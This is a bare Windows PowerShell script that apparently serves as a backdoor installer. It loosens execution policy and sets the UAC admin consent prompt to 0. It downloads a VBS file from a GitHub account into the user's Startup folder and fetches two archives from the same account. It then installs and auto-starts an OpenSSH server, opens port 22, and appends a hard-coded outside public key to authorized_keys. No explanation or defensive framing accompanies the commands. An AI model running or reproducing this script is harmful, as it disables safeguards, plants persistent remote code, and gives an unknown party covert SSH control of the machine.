PowerShell Set-ExecutionPolicy RemoteSigned -Force
PowerShell Set-ExecutionPolicy Unrestricted -Force
PowerShell Set-ExecutionPolicy Bypass -Scope Process -Force
PowerShell Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value "0" 
PowerShell New-Item -Path C:\ -Name temp -ItemType Directory
PowerShell New-item -Path $env:USERPROFILE -Name .ssh -ItemType Directory -force
PowerShell [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/ghostman2709/files/main/iniciar.vbs ','C:\%HoMePath%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\iniciar.vbs')
PowerShell [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/ghostman2709/files/main/OpenSSH-Win64.zip','C:\temp\OpenSSH-Win64.zip')
PowerShell [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; (New-Object System.Net.WebClient).DownloadFile('https://github.com/ghostman2709/files/raw/main/temp.zip','C:\temp\temp.zip')
PowerShell Expand-Archive -Path "C:\temp\temp.zip" -DestinationPath "C:\temp"
PowerShell Expand-Archive -Path "c:\temp\OpenSSH-Win64.Zip" -DestinationPath "C:\ProgramData\OpenSSH"
PowerShell . "C:\ProgramData\OpenSSH\OpenSSH-Win64\install-sshd.ps1"
PowerShell New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
PowerShell Write-Output "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLmJB6QgmwvCIRcoV0Z1f71jlb501bJgH9graC8ZE1BJju8DlI9s7JwA/PrrhAMckxR9t6VTeZWdaxGlB5ZwloDKIgXgTCHkwoKi9j209z2SOo++HJjZNvS5qVZeci99pGxfGOR0IavaR3+joL8UW94RTURek54/oXRzICF39aFCyYbN8FaW0bZQb+QDqYLu/7aiY6Eaxk8LgMov4vic8YX9iguK16Iqjub1f8x3l8xpqqCHtLXPc5VIGPvNhg4ayEvlQzFAHELQ4k9DhJgcIUxMHUmqFNZgrGtKWUAP8JVd0SPM+KFaHNbyGha+bHNC3kYrdA/WgNFqZgaYe/QaE5xKzT/jLMxAP/j45FCRiyWCi4252guRGFsMAtb5BoAaIJOuAB59nXZaWMCBB2DJ92QwpE6mYXQVA76/xReV5H5fSuYnvNhv7Cg/lq1RI6r/o8dXvha27JCKJadjGLhswthjFxC76YqEIeJdf+MjSYhwc1wh5GljJCL43KViC+9cE= u0_a747@localhost" >> C:\%HoMePath%\.ssh\authorized_keys
PowerShell Set-Service sshd -StartupType Automatic
PowerShell Start-Service sshd
EXIT
